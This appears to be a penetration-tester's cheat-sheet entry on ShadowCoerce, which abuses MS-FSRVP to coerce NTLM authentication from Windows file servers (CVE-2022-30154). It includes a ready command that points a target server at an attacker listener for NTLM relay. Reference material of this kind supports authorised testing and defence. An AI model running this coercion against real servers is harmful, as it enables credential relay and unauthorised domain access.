---
technique: MS-FSRVP Abuse (ShadowCoerce)
category: mitm
targets: File Servers with File Server VSS Agent Service
protocols: SMB, RPC
remote_capable: true
tags: mitm coercion ms-fsrvp shadowcoerce rpc smb ntlm-relay cve-2022-30154
---

# MS-FSRVP Abuse (ShadowCoerce)

MS-FSRVP (File Server Remote VSS Protocol) is used for creating shadow copies of file shares. The `IsPathSupported` and `IsPathShadowCopied` methods accept remote UNC paths and can be abused to coerce NTLM authentication from any server running the "File Server VSS Agent Service". This was patched as CVE-2022-30154 in June 2022.

## Windows

No native Windows tooling is commonly used for this attack; see the Linux section.

## Linux

ShadowCoerce implements the two vulnerable MS-FSRVP methods.

### shadowcoerce

#python #coercion #password

Force the target File Server VSS Agent to authenticate to the attacker's listener using domain credentials.

```sh title:"Coerce MS-FSRVP authentication with ShadowCoerce"
shadowcoerce.py -d "$domain" -u "$user" -p "$pass" "$lhost" "$rhost"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost
-->
